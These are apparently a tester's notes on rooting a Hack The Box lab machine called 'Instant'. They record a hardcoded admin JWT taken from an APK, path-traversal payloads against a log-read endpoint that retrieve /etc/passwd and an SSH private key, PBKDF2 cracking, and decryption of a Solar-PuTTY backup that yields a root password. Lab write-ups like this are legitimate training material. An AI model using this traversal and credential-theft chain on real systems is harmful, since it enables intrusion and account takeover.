# Instant — 10.129.231.155

**Status:** ✅ **ROOTED** — user.txt + root.txt captured.

## Kill chain  (see ../../METHODOLOGY.md)
- [x] P1 Recon (nmap full + services)
- [x] P3 Web enum (vhosts, dirbrute, source, auth mechanism)
- [x] P4 Web exploit — admin authz bypass (hardcoded JWT) → LFI → SSH key
- [x] P5 Foothold + stabilize (SSH as `shirohige`)
- [x] P6 Local recon (internal ports, owned-file sweep → Solar-PuTTY backup)
- [x] P7 Privesc → **root** (`su -`)

---

## 1. Infrastructure
- Target: `10.129.231.155`
- Hostname: `instant.htb` (in `/etc/hosts`)
- **vhosts (from APK `res/xml/network_security_config.xml`, not from fuzzing):**
  - `mywalletv1.instant.htb` (includeSubdomains)
  - `swagger-ui.instant.htb` (includeSubdomains)
- OS: Ubuntu (Apache 2.4.58 + OpenSSH 9.6p1 3ubuntu13.5 → Ubuntu 24.04 noble)

### Ports (`scans/allPorts_Scripts.nmap`, full `-p-` TCP `-sCV`)
| port | service | version | notes |
|------|---------|---------|-------|
| 22/tcp | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 | current, no known RCE — creds/key needed |
| 80/tcp | http | Apache httpd 2.4.58 (Ubuntu) | title: **Instant Wallet** |

Only 2 ports open — 65533 closed, so surface is entirely **web**. No UDP scan yet.

## 2. Enumeration

### Content brute (http://instant.htb/)
```
/index.html
/css/default.css
/js/scripts.js
/img/{logo.png, blog-1.jpg, blog-2.jpg, blog-3.jpg}
/downloads/            → /downloads/instant.apk     ← APK available
/dowloads              (typo'd variant also listed — confirm status code, likely 301/404 artifact)
/server-status         (Apache mod_status — confirm whether 200 or 403)
```
- **Static site**: no `.php`/dynamic extensions surfaced. The web root looks like a
  brochure page; the real app is presumably the **mobile client** in the APK.
- **No vhost fuzz recorded yet** (P3 item still open).

### APK decompile (`loot/instant_apk/`, via `jadx -d`)
- `res/xml/network_security_config.xml` declares cleartext/pinning policy for:
  - **`swagger-ui.instant.htb`** — ✅ **LIVE** (Swagger UI = self-documenting API spec)
  - **`mywalletv1.instant.htb`** — ✗ nothing served on `/` (see caveat below)
- Both added to `/etc/hosts` → `10.129.231.155`.
- **Caveat on "not live":** an API vhost returning 404/empty on `/` is normal — REST apps
  often have no route for the bare root. Also, if Apache has no `ServerName` match, the
  request silently falls through to the *default* vhost (the main instant.htb site), which
  looks like "wrong content" rather than "down". Don't write the host off until the Swagger
  spec confirms the real base path/port it expects.

### API spec (`loot/apispec_1.json`, from swagger-ui.instant.htb)
- **Swagger 2.0**, `info.description = "powered by Flasgger"` → backend is **Python / Flask**
  (Flasgger is the Flask OpenAPI plugin). Title: *"Instant API - Transfer Funds Without Limits!"* v0.0.1
- **Auth: `BearerAuth`** — `type: apiKey`, `in: header`, `name: Authorization`.
  Login returns an **`Access-Token`** → token-based, sent in the `Authorization` header.

| method | path | auth | body / params |
|---|---|---|---|
| POST | `/api/v1/register` | **open** | username, email, password, pin |
| POST | `/api/v1/login` | **open** | username, password → returns `Access-Token` |
| GET | `/api/v1/view/profile` | auth | — (returns role, wallet_id, **invite_token**, balance) |
| GET | `/api/v1/view/transactions` | auth | — |
| POST | `/api/v1/initiate/transaction` | auth | receiver*, amount*, note |
| POST | `/api/v1/confirm/pin` | auth | pin |
| GET | `/api/v1/admin/list/users` | auth | — |
| POST | `/api/v1/admin/add/user` | auth | username, email, password, pin, **role** |
| GET | `/api/v1/admin/view/logs` | auth | — |
| GET | `/api/v1/admin/read/log` | auth | **`log_file_name`** (query, string) |

**High-signal observations:**
- `/api/v1/admin/read/log` takes a **filename as a query param** — classic path-traversal /
  arbitrary-file-read shape. `LogReadResponse.FileName` example leaks an absolute path:
  **`/home/shirohige/logs/1.log`** → local user is likely **`shirohige`**.
- `RegisterRequest` has NO `role` field, but `AddUserRequest` (admin) DOES → check whether
  `/register` silently accepts an extra `role` key (**mass assignment**).
- `ProfileResponse` exposes an **`invite_token`** — unclear purpose yet, possible privilege/
  registration bypass material.
- Everything under `/admin/*` is gated only by the same Bearer token → whatever makes a token
  "admin" (a claim? a DB role lookup?) is the authz boundary to attack.

### Sweep results w/ instantian token (`loot/api_sweep.json`, via `exploits/api_sweep.py`)
| endpoint | code | body |
|---|---|---|
| POST `/admin/add/user` | **401** | `UnAuthorized` |
| GET `/admin/list/users` | **401** | `UnAuthorized` |
| GET `/admin/read/log` | **401** | `UnAuthorized` |
| GET `/admin/view/logs` | **401** | `UnAuthorized` |
| POST `/confirm/pin` | 403 | `Incorrect Pin` (sent 12345 — *registered* pin, so pin≠what it wants, or it's txn-scoped) |
| POST `/initiate/transaction` | 403 | `Your Balance Is Not Enough!` |
| POST `/login` | 201 | new token issued |
| POST `/register` | 202 | `You have an account! Please Login!` (dup-user path) |
| GET `/view/profile` | 200 | full profile |
| GET `/view/transactions` | 404 | `No Transactions Found` |

**Key inference — the admin gate is role-based, not token-validity-based:**
the *same* token returns **200** on `/view/profile` and **401** on all four `/admin/*`
routes. So the signature verifies fine and the session is genuinely authenticated; the
rejection is purely the `role` claim not being `admin`. The app reuses 401 where 403 would
be correct, but behaviourally it's an **authorization** decision keyed on a claim we control
the plaintext of. → forging/re-signing the JWT with `role:admin` is the lever.

### APK source review (`sources/com/instantlabs/instant/`, 8 activities — rest is framework)
App package: `com.instantlabs.instant`. Only 9 app-owned files out of 4175; everything else
is androidx/okhttp/kotlin/gson boilerplate. `R.java` is resource IDs (ignore).

**🔑 `AdminActivities.java` — hardcoded Admin JWT**, in a leftover debug method
`TestAdminAuthorization()` that calls `/api/v1/view/profile` with a literal `Authorization`
header. Decoded:
```json
{"id":1, "role":"Admin", "walId":"f0eca6e5-783a-471d-9d8f-0162cbc900db", "exp":33259303656}
```
- `exp` = **3023-12-12** → effectively never expires.
- `role` is **`"Admin"`** (capital A) — note case differs from our `"instantian"`.
- Already signed with the server's secret → **no cracking or forging needed.**

**Other app files (nothing new):**
- `LoginActivity` — POSTs `/login`, stores `Access-Token` in SharedPreferences (`access_token`)
- `RegisterActivity` — POSTs `/register`
- `ProfileActivity` — GETs `/view/profile`, sends raw token in `Authorization` (confirms no `Bearer`)
- `TransactionActivity` — POSTs `/initiate/transaction` then `/confirm/pin`
- `ForgotPasswordActivity` — **stub**: UI only, just a back button to LoginActivity. No endpoint.
- `SplashActivity`, `MainActivity` — navigation only.

**All hardcoded URLs in the APK** (only 5, all on `mywalletv1`):
`/api/v1/{register,login,view/profile,initiate/transaction,confirm/pin}`
→ the APK never calls any `/admin/*` route except via that one debug method. No other
secrets, API keys, or creds anywhere in app code or `strings.xml`.

### ✅ Admin access confirmed
`GET /api/v1/view/profile` with the APK's hardcoded Admin JWT → **200 OK**:
```json
{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv",
 "role":"Admin","username":"instantAdmin","wallet_balance":"10000000",
 "wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"}
```
Admin identity = **`instantAdmin` / admin@instant.htb / id 1**. The token is accepted as-is,
so all four `/admin/*` routes are now reachable — incl. `admin/read/log?log_file_name=`
(the arbitrary-file-read shape) and `admin/list/users` (user + hash dump?).

### `GET /api/v1/admin/list/users` (Admin token) → 200
| username | email | role | secret_pin | wallet_id |
|---|---|---|---|---|
| instantAdmin | admin@instant.htb | Admin | **87348** | f0eca6e5-783a-471d-9d8f-0162cbc900db |
| **shirohige** | shirohige@instant.htb | instantian | **42845** | 458715c9-b15e-467b-8a3d-97bc3fcf3c11 |
| dvraziwg | jaopqbly | instantian | 12345 | 130af80f-… |
| testuser | test@test.com | instantian | 12345 | 2a09816f-… |
| sweepuser | sweep@test.com | instantian | 12345 | fd3058c4-… |
| sweepadmin | sweepadmin@test.com | instantian | 12345 | f546efa9-… |

**Findings:**
- **`shirohige` is a real app user** — matches the `/home/shirohige/logs/1.log` path leaked in
  the Swagger example. Same name in the app DB *and* the filesystem → almost certainly the
  local Linux user. No password here, but we now have their **PIN 42845** and email.
- **PINs are stored/returned in CLEARTEXT** (`secret_pin`), not hashed. Admin PIN = 87348.
- `dvraziwg` / `jaopqbly` — junk account from another HTB player, **not ours**. Ignore.
- ⚠️ **Our own noise:** `testuser` (manual), `sweepuser` + `sweepadmin` (created by
  `exploits/api_sweep.py` sample bodies). Remember these are ours when reading the table.
- **`sweepadmin` has role `instantian`, not `admin`** despite the sweep body sending
  `"role":"admin"`. Two readings — needs one clarifying re-test:
  (a) it was created by `/register` (which ignores `role`) → mass assignment **fails**, or
  (b) it was created by `/admin/add/user` with the admin token and the server **ignored the
  supplied role**. Either way, **no evidence of role escalation via user creation.**
- **Reconciles the earlier `/confirm/pin` 403:** testuser's stored pin genuinely *is* 12345,
  yet confirming it returned `Incorrect Pin` → confirms `/confirm/pin` is **transaction-scoped**
  (needs a pending txn), not a standalone account-pin check.

### `GET /api/v1/admin/view/logs` (Admin token) → 201
```json
{"Files":["1.log"], "Path":"/home/shirohige/logs/", "Status":201}
```
- **Confirms the log dir is real: `/home/shirohige/logs/`** — the Swagger example path was
  not a placeholder. Also confirms the API process can read inside `shirohige`'s home
  → **the Flask app is very likely running AS `shirohige`** (or as root/a group with access).
- Only one file present (`1.log`), so `read/log` has essentially nothing legitimate to serve
  → the interesting use of `log_file_name` is reaching files *outside* this dir.
- `log_file_name` is joined to `Path` server-side. Untested: whether it's
  `os.path.join(base, name)` (absolute paths override the base entirely in Python) or a
  naive concat (needs `../` traversal). **Both are worth trying.**

### `GET /api/v1/admin/read/log?log_file_name=1.log` → 201 (baseline)
```json
{"/home/shirohige/logs/1.log": ["This is a sample log testing\n"], "Status": 201}
```
- Read works. Contents are a **JSON array of lines** (file is `readlines()`-style split).
- **The response key is the fully-resolved server-side path** → this endpoint is its own
  **oracle**: whatever you send back-comes echoed as the path the server actually opened.
  So even a failed read tells you *how* your input was resolved (join vs concat, whether
  `../` was stripped, whether a suffix was appended). Test payloads read their own results.

### 🔥 LFI / arbitrary file read — `admin/read/log?log_file_name=../../../etc/passwd`
```json
{"/home/shirohige/logs/../../../etc/passwd": ["root:x:0:0:root:/root:/bin/bash\n", ...]}
```
- **Naive concatenation** — no sanitisation at all. `../` is passed straight through and
  the resolved key still shows the literal traversal (kernel resolves it, app doesn't
  normalise). No extension appended, no filter, no `..` stripping.
- Read as **shirohige** (or better). Primitive = arbitrary text-file read.

**`/etc/passwd` takeaways:**
- **`shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash`** — real login shell,
  uid 1001. The *only* human user on the box. ("White Beard" = Edward Newgate, One Piece —
  matches "instant"/Whitebeard theming.)
- **`_laurel:x:999:990::/var/log/laurel:/bin/false`** — **Laurel is an auditd plugin** that
  transforms audit events into JSON in `/var/log/laurel/`. That is an **audit log of every
  execve on the box, incl. command lines** — historically a rich source of creds typed into
  CLI tools. Not standard on stock Ubuntu → deliberately installed here.
- No other service accounts of note (no mysql/postgres/redis) → app data is probably
  SQLite or flat files, not a DB server (consistent with only 22/80 open).

**Read targets to queue:** app source (find the Flask app root), any SQLite DB,
`/home/shirohige/.ssh/id_*`, `/home/shirohige/.bash_history`, `/var/log/laurel/*`,
`/etc/ssh/sshd_config`, `/proc/self/cmdline` + `/proc/self/environ` (reveals app path & env).

### Cracking shirohige's app password (PBKDF2)
Stored: `pbkdf2:sha256:600000$YnRgjnim$c9541a8c...` — Werkzeug default, **600k iterations**.
- Derivation verified locally against `testuser` (known pw `password`) → salt is **raw ASCII**,
  digest is hex of the 32-byte key. Converter: `exploits/werkzeug_to_hashcat.py`
  (`--format hashcat` = `-m 10900`, `--format john` = `PBKDF2-HMAC-SHA256`).
  John format validated end-to-end by cracking the known testuser hash. ✅
- Files: `loot/shirohige_pbkdf2.hash` (hashcat), `loot/shirohige_john.hash` (john)
- ⚠️ **hashcat is unusable in this VM** — `CL_PLATFORM_NOT_FOUND_KHR`, no OpenCL/CUDA runtime.
- john CPU bench: 37097 c/s @1k iters → **~62 c/s @600k** (8 OpenMP threads).

| wordlist slice | ETA on this VM |
|---|---|
| first 100k | 24 min |
| first 1M | 4.5 h |
| full rockyou (14.3M) | **64 h (2.7 days)** |

→ Full rockyou is not viable here. rockyou is roughly frequency-ordered, so a *common*
password lands in the first minutes; if nothing hits in ~30 min it likely isn't in the
common head, and the remaining days of runtime are low-yield.

**✅ CRACKED on the Windows host / RTX 5060 Ti in ~1 minute: `estrella`**
- Actual GPU rate **4314 H/s** (not the ~10k H/s I estimated — PBKDF2's serial iteration
  chain limits GPU occupancy; only *across* candidates parallelises, not within one).
  Full-rockyou ETA was 55 min; the hit came ~1 min in because rockyou is frequency-ordered.
- Lesson: **run the wordlist before optimising the wordlist.** 600k iterations looked
  prohibitive on paper, but a common password is found in the first fraction of a percent.
  Same cost to start; the "is this feasible" analysis nearly talked us out of a 1-min win.

### Open questions
- [ ] `/server-status` — accessible or 403? If 200 it leaks request URIs incl. vhosts/params
- [ ] vhost fuzz on `instant.htb` — any subdomains beyond the two the APK named?
- [ ] APK sources: hardcoded API base URL, tokens, keys? (`sources/` + `strings.xml`)

## 3. Foothold
_TBD_

## 4. Loot (creds / hashes / keys)
| what | value | source | cracked? |
|------|-------|--------|----------|
| app acct | `testuser` / `password` / pin `12345` / test@test.com | self-registered via `/api/v1/register` | n/a |
| app users + PINs | `instantAdmin` pin **87348**; **`shirohige`** pin **42845** (shirohige@instant.htb) | `/api/v1/admin/list/users` | cleartext, no hashing |
| **shirohige app password** | **`estrella`** | `instant.db` → hashcat `-m 10900` rockyou | ✅ **cracked in ~1 min** |
| **🔑 ROOT password** | `root` : `12**24nzC!r0c%q12` | Solar-PuTTY session store (decrypted w/ `estrella`) | n/a — plaintext |
| **SSH privkey** | `loot/id_rsa_shirohige` (chmod 600) — RSA 3072, comment `shirohige@instant`, fingerprint `SHA256:fgBueI9VDJ+7KmpFJxiOgv/DNgirnswJl/47iQTwMPw` | LFI → `/home/shirohige/.ssh/id_rsa` | **no passphrase** ✅ |
| JWT (instantian) | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjJhMDk4MTZmLTE0YzQtNGU3ZS1hMjY4LTFmNjQxZDU0MmUwYyIsImV4cCI6MTc4Nzc4MzAzNX0.SclKyQ0rxRxajvHjViPBFt9JxPtmoix6y8QpOqDy7us` | `/api/v1/register` response | secret not cracked |
| **JWT (Admin)** | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA` | **hardcoded in APK** `AdminActivities.java` | n/a — valid, signed |

### JWT analysis
- **Header:** `{"alg":"HS256","typ":"JWT"}` — symmetric HMAC-SHA256, 32-byte sig.
- **Payload:** `{"id":4, "role":"instantian", "walId":"2a09816f-...", "exp":1787783035}`
  (exp = 2026-08-26 22:23 UTC, ~8h life)
- **`role` is a claim inside the token** → if the API trusts the claim rather than
  re-checking the DB, forging `role":"admin"` unlocks all `/admin/*`. Requires either
  the HMAC secret (crack/leak) or an alg-confusion/`alg:none` bypass.
- Registration assigned `role: instantian` server-side — `/register` schema has no `role`
  field, so mass assignment via `/register` still untested.
- **The API accepts the raw token in `Authorization:` with NO `Bearer ` prefix** (confirmed
  on `/view/profile`, 200 OK). Sloppy parsing — worth remembering for tooling.

### `/view/profile` (id=4, testuser)
```json
{"account_status":"active","email":"test@test.com","invite_token":"testuser_tes",
 "role":"instantian","username":"testuser","wallet_balance":"0",
 "wallet_id":"2a09816f-14c4-4e7e-a268-1f641d542e0c"}
```
- ~~**`invite_token` is DERIVABLE**: `testuser_tes` = `username` + `_` + `email[:3]`~~
  **❌ HYPOTHESIS DISPROVEN** by the admin profile: username `instantAdmin` +
  email `admin@instant.htb` → invite_token `instant_admin_inv`, **not** `instantAdmin_adm`.
  The `tes`/`testuser` overlap in the first sample was coincidence, exactly as flagged.
  Actual scheme unknown (looks like a truncated/normalised slug, 17 chars here vs 12 there).
  Not obviously predictable. Purpose still unknown; no spec endpoint consumes it.
  → **Lesson: a pattern from one sample is a hypothesis, not a finding.**
- `wallet_balance` is a **string** `"0"`, not an int (spec says integer) → type-juggling /
  injection surface on transaction amounts.

## 5. Privesc

### Internal listeners (`netstat -tulpn` as shirohige)
| bind | port | PID / prog | notes |
|---|---|---|---|
| 127.0.0.1 | **8888** | 1292 `python3` | localhost-only, **PID visible → owned by shirohige** |
| 127.0.0.1 | **8808** | 1315 `python3` | localhost-only, **PID visible → owned by shirohige** |
| :: | 80 | – (not owned) | Apache, runs as root/www-data |
| :: | 22 | – (not owned) | sshd |
| 127.0.0.53/.54 | 53 | – | systemd-resolved, ignore |

- **Two extra Python services bound to loopback** — invisible from the outside (nmap saw
  only 22/80), so these are new attack surface only reachable now.
- netstat shows `PID/Program name` for 8888/8808 but `-` for 80/22 → per the banner, we can
  only see processes **we own**. So both Python services run **as shirohige**, i.e. they are
  almost certainly the Flask API (one of them) + something else. Privesc-wise that means
  neither is *directly* a root escalation... unless something root-owned talks to them.
- 8888/8808 are adjacent to the API's public role — worth identifying which is the wallet
  API and what the other one is.

### 🎯 `/opt/backups/Solar-PuTTY/sessions-backup.dat` (owned by shirohige)
Found via `find / -user shirohige -type f` filtered outside `$HOME` — the only genuinely
interesting hit (the rest are `/run/user/1001/systemd/*` runtime cruft).

**What it is:** Solar-PuTTY (SolarWinds' PuTTY fork) stores its saved sessions — hostnames,
usernames, **passwords / private keys** — in a single `sessions-backup.dat`. The file is
JSON that has been AES-encrypted and base64-wrapped, using a **user-supplied passphrase**
as the key. Weak KDF: historically a straight `PasswordDeriveBytes`/SHA1 construction with
a small iteration count, so it is **brute-forceable with a wordlist**, unlike the 600k-round
PBKDF2 we just cracked.
- Public tooling: VoidSec's **SolarPuTTYDecrypt** (C#) and various Python reimplementations;
  the usual approach is wordlist → decrypt attempt → valid-JSON check as the oracle.
- Related: **CVE-2020-14005** — Solar-PuTTY stored session credentials insecurely.
- Sometimes the `.dat` is *not* encrypted at all and is plain JSON. **Check that first** —
  `head -c 200` on it will tell you immediately (`{` / readable keys vs base64 blob).

**✅ DECRYPTED.** Passphrase = **`estrella`** — the same password cracked from `instant.db`,
reused as the Solar-PuTTY export passphrase. Output: `loot/SolarPutty_sessions_decrypted.txt`.
```sh
~/HTB/tools/SolarPuttyDecryptV2/dist/linux-x64/SolarPuttyDecrypt \
    sessions-backup.dat -w /tmp/known.txt      # or just: ... sessions-backup.dat estrella
```
- Tool = our modernised fork (`HTB/tools/SolarPuttyDecryptV2`, .NET 6 standalone binary).
  Had to fix an IV-length bug to make it work on .NET 6 at all — see that repo's README.
- **Lesson repeated:** `estrella` failed for SSH *and* for `sudo`, but was right here.
  A cracked password rejected in one context is not dead — retry it in every new context.

**Contents (resolved):** the JSON has `Sessions[]` and `Credentials[]` joined by
`CredentialsID` → `Credentials.Id`. One session:
| SessionName | Host:Port | Type | Username | Password |
|---|---|---|---|---|
| Instant | `10.10.11.37`:22 (author's original lease — use our own target IP) | 1 = SSH | **root** | **`12**24nzC!r0c%q12`** |

No private key stored (`PrivateKeyPath`/`PrivateKeyContent` empty) → password auth.

### ✅ ROOT — `su -` as shirohige with `12**24nzC!r0c%q12`
- **`ssh root@target` FAILED, `su -` SUCCEEDED with the same password.** The credential was
  always correct; **sshd policy** was the blocker (Ubuntu defaults to
  `PermitRootLogin prohibit-password`, which rejects password auth for root but still shows
  a prompt → indistinguishable from a wrong password on the client side).
- **Lesson:** a failed SSH password login is an *ambiguous* result, not a negative. Test
  credentials against PAM directly (`su -`) where possible; SSH policy sits in front of the
  password check and hides the real answer.

**Next checks (no traffic yet):** `ps -fp 1292 1315` for full command lines & cwd,
`ls -l /proc/{1292,1315}/cwd`, then curl each locally. SSH tunnel to reach from Kali:
`ssh -i loot/id_rsa_shirohige -L 8888:127.0.0.1:8888 -L 8808:127.0.0.1:8808 shirohige@10.129.231.155`

## 6. Dead ends
- **`estrella` is NOT reused for the Linux/SSH account.** App password ≠ system password
  here (unlike MonitorsThree, where the Cacti password worked for `su marcus`). SSH access
  is via the stolen private key only. Still worth retrying `estrella` later for `sudo`,
  other services, or any password prompt encountered post-foothold — a negative on SSH
  isn't a negative everywhere.
- **`sudo -l` prompts for a password and `estrella` is rejected.** So the app password is
  not the Linux password for `shirohige` either → sudo enumeration is closed to us for now.
  (Can't even *list* sudo rights without the real password.) Both known secrets — `estrella`
  and PIN 42845 — are app-scoped only.
- **`/js/scripts.js`** — 200, 2022 bytes, Last-Modified 2024-08-08. Pure jQuery theme
  boilerplate: feather icons, tooltips/popovers, page-scroll anim, slick slider, sticky-nav
  class toggling, scroll-to-top, demo colour switcher. **No endpoints, no API base, no keys,
  no auth logic.** Only DOM write is the theme switcher
  (`$('#theme-color').attr("href","css/"+color+".css")`) but `color` comes from a hardcoded
  `data-color` attribute in the markup, not from URL/user input — no DOM-XSS sink.
  → Confirms the web root is an unmodified marketing template; the app logic is not here.

## 7. Lessons

1. **Whitebox first — the client ships the secrets.** The APK gave up two things fuzzing
   never would: the vhost names (`network_security_config.xml`) and a **hardcoded, signed,
   never-expiring Admin JWT** (`AdminActivities.java`). We were lining up a JWT secret-crack
   / alg-confusion attack; reading the code made all of it unnecessary.
2. **Filter to the app's own package.** The decompiled APK was 4175 files; only **9** were
   `com.instantlabs.instant`. The rest was androidx/okhttp/kotlin boilerplate. Overwhelm is
   usually a filtering problem.
3. **Swagger is an input inventory, and a floor not a ceiling.** It handed us every endpoint,
   parameter, auth scheme, *and* a leaked absolute path (`/home/shirohige/logs/1.log`) in an
   `example:` field — devs write examples against their real deployment.
4. **Compare responses, don't read them in isolation.** Same token → 200 on `/view/profile`,
   401 on `/admin/*`. That contrast proved the signature verified and the gate was purely the
   `role` claim. One response alone said nothing.
5. **Guessing the claim value would have failed.** The role is `"Admin"`, capital A. A forged
   `"admin"` returns the same 401 as a bad signature — you'd have blamed the crypto.
6. **A pattern from one sample is a hypothesis.** `invite_token = username + "_" + email[:3]`
   fit `testuser`/`test@test.com` perfectly and was **wrong** — `tes` overlapped by chance.
   The admin account disproved it. Get a second, deliberately dissimilar sample.
7. **Run the wordlist before optimising the wordlist.** 600k-iteration PBKDF2 looked
   prohibitive (2.7 days in the VM, 55 min on the GPU); `estrella` fell in **~1 minute**
   because rockyou is frequency-ordered. Starting costs the same as theorising about starting.
8. **Ambiguous negatives are not negatives.** `estrella` was rejected by SSH *and* `sudo`, then
   turned out to be the Solar-PuTTY passphrase. `ssh root@` failed while `su -` succeeded with
   the identical password — sshd's `PermitRootLogin prohibit-password` rejects before
   evaluating the password and looks exactly like a wrong one. **Test credentials against the
   least-gated path available** (PAM via `su`), and retry known creds in every new context.
9. **Verify tooling against a known-good sample before trusting a negative.** The Werkzeug→
   hashcat conversion was validated against `testuser` (known password `password`) first; the
   Solar-PuTTY decryptor got a `--selftest` vector. Both classes of tool report *"wrong
   password"* when they're simply broken.
10. **Old tools break in ways that look like user error.** SolarPuttyDecrypt's 24-byte IV was
    silently truncated by .NET Framework and is rejected outright by .NET 6+ — a straight port
    fails on every real file with `ArgumentException`. Fixed in our fork.
11. **`file`/`ls` before `cat`.** Checking that `sessions-backup.dat` was a high-entropy blob
    (7.74 bits/byte) rather than JSON saved a pointless detour.

## 7b. What the box was teaching (CWES relevance)
- **Hardcoded credentials in a mobile client** — the whole foothold.
- **Broken authorisation via a trusted token claim** (`role` inside the JWT).
- **Path traversal in a filename parameter** (`log_file_name`), naive concatenation.
- **Information disclosure** — Swagger examples, cleartext PINs, `/admin/list/users`.
- Nothing needed a payload more exotic than `../`. **Enumeration and reading beat cleverness.**

## 8. Command log
| # | command | result / coverage caveat |
|---|---------|--------------------------|
| 1 | `nmap -p- -sV -sC -oA scans/allPorts_Scripts instant.htb` | 22 (OpenSSH 9.6p1) + 80 (Apache 2.4.58) open; all 65533 others closed. TCP only — no UDP coverage. |
| 2 | content brute on `http://instant.htb/` (tool/wordlist not recorded) | tree above; found `/downloads/instant.apk`, `/server-status`. **No status codes captured** — listing alone doesn't prove 200. |
| 3 | `GET /js/scripts.js` | 200, template boilerplate only — no endpoints/keys. See §6. |
| 4 | `jadx -d loot/instant_apk loot/instant.apk` | decompiled OK. NOTE: Kali `jadx` wrapper `cd`s to `/usr/share/jadx/bin`, so **relative paths break** — pass absolute paths. |
| 5 | read `instant_apk/resources/res/xml/network_security_config.xml` | found vhosts `mywalletv1.instant.htb`, `swagger-ui.instant.htb` |
| 6 | browse `swagger-ui.instant.htb`, saved spec → `loot/apispec_1.json` | full API map, 10 endpoints, Flask/Flasgger, Bearer auth. `mywalletv1` answers on some routes (not `/`). |
| 7 | `POST /api/v1/register` `{username:testuser, password:password, pin:12345, email:test@test.com}` | **201 CREATED**, returns `Access-Token` immediately (no separate login needed). Server: **Werkzeug/3.0.3 Python/3.12.3** (dev server). Sent to `Host: swagger-ui.instant.htb` — the API answers on this vhost too. |
| 8 | `GET /api/v1/view/profile` w/ raw token in `Authorization` (no `Bearer`) | 200 OK. Leaks `invite_token: testuser_tes` = username+`_`+email[:3] → **predictable**. |
| 9 | `python3 exploits/api_sweep.py -t <tok> -o` | all 10 endpoints hit → `loot/api_sweep.json`. 4x `/admin/*` = 401, user routes = 200/403/404. Same token works on user routes → gate is the **role claim**, not token validity. |
| 10 | grep/read `sources/com/instantlabs/instant/*.java` (local, no traffic) | **hardcoded Admin JWT** in `AdminActivities.java` (`role:Admin`, exp 3023). No other secrets in APK. |
| 11 | `GET /view/profile` w/ Admin JWT | 200 — `instantAdmin`, id 1. Admin surface unlocked. |
| 12 | `GET /admin/list/users` | 6 users + **cleartext `secret_pin`**. `shirohige` pin 42845. |
| 13 | `GET /admin/view/logs` | `{"Files":["1.log"],"Path":"/home/shirohige/logs/"}` |
| 14 | `GET /admin/read/log?log_file_name=1.log` | baseline read OK; response key = resolved path (oracle). |
| 15 | `GET /admin/read/log?log_file_name=../../../etc/passwd` | **LFI confirmed** — naive concat, no sanitisation. Got `/etc/passwd`; user `shirohige` (1001), `_laurel` auditd plugin present. |
| 16 | `GET /admin/read/log?log_file_name=../.ssh/id_rsa` | **SSH private key for shirohige**. Note: only `../` once — from `logs/` up to the home dir. Saved `loot/id_rsa_shirohige`. |
| 17 | `ssh-keygen -y -f loot/id_rsa_shirohige` (local) | parses clean, **no passphrase**, RSA 3072, comment `shirohige@instant`. |
| 18 | `ssh -i loot/id_rsa_shirohige shirohige@10.129.231.155` | foothold as `shirohige`. |
| 19 | `sudo -l` | prompts for password; `estrella` rejected → closed. |
| 20 | `netstat -tulpn` | loopback-only python3 on **8888** and **8808**, both owned by shirohige. |
| 21 | `find / -user shirohige -type f 2>/dev/null \| grep -v '^/proc\|^/sys\|^/home/shirohige'` | **`/opt/backups/Solar-PuTTY/sessions-backup.dat`** (rest was `/run/user/1001` cruft). |
| 22 | `scp` the .dat → `SolarPuttyDecrypt sessions-backup.dat -w <list>` (local) | passphrase **`estrella`** (reuse) → root creds. |
| 23 | `su -` as shirohige, password `12**24nzC!r0c%q12` | **ROOT.** (`ssh root@` failed first — sshd policy, not a bad password.) |

## 8b. Full kill chain
```
nmap -p-                       →  only 22 (OpenSSH 9.6p1) + 80 (Apache 2.4.58)
http://instant.htb             →  static template site, /downloads/instant.apk
jadx -d ... instant.apk        →  network_security_config.xml
                                    → mywalletv1.instant.htb, swagger-ui.instant.htb
swagger-ui.instant.htb         →  full OpenAPI spec (Flask/Flasgger), 10 endpoints,
                                  Bearer auth, leaked path /home/shirohige/logs/1.log
POST /api/v1/register          →  low-priv JWT  {role:"instantian"}  → /admin/* = 401
AdminActivities.java (APK)     →  HARDCODED Admin JWT {id:1, role:"Admin", exp:3023}
GET  /admin/list/users         →  all users + CLEARTEXT secret_pin
GET  /admin/read/log
       ?log_file_name=../.ssh/id_rsa
                               →  LFI (naive concat) → shirohige's SSH PRIVATE KEY
ssh -i id_rsa shirohige@target →  FOOTHOLD (user.txt)
instant.db (Flask SQLite)      →  pbkdf2:sha256:600000 hashes
hashcat -m 10900 + rockyou     →  shirohige : estrella   (~1 min, GPU)
find / -user shirohige         →  /opt/backups/Solar-PuTTY/sessions-backup.dat
SolarPuttyDecrypt -w ...       →  passphrase "estrella" (reuse) → root : 12**24nzC!r0c%q12
su -                           →  ROOT (root.txt)   [ssh root@ blocked by sshd policy]
```

## 9. Files
- `scans/allPorts_Scripts.*` — full TCP `-sCV` nmap
- `exploits/api_sweep.py` — sweeps every endpoint in the Swagger spec with a token, `-o` saves JSON
- `exploits/werkzeug_to_hashcat.py` — Werkzeug pbkdf2 → hashcat `-m 10900` / john format
- `loot/instant.apk`, `loot/instant_apk/` — the APK and its jadx output
- `loot/apispec_1.json` — Swagger spec · `loot/api_sweep.json` — sweep results
- `loot/id_rsa_shirohige` (+ `.pub`) — recovered SSH key
- `loot/instant.db` — Flask SQLite DB
- `loot/shirohige_pbkdf2.hash` (hashcat) · `loot/shirohige_john.hash` (john)
- `loot/sessions-backup.dat` — encrypted Solar-PuTTY store
- `loot/SolarPutty_sessions_decrypted.txt` — decrypted, contains root creds

**Tooling built/fixed during this box:**
`~/HTB/tools/SolarPuttyDecryptV2` — modernised SolarPuttyDecrypt (.NET 6 standalone binary,
`--wordlist`, `--selftest`, fixed IV-length + truncation bugs, finished the msf module,
automated releases). Released as v2.0.0.
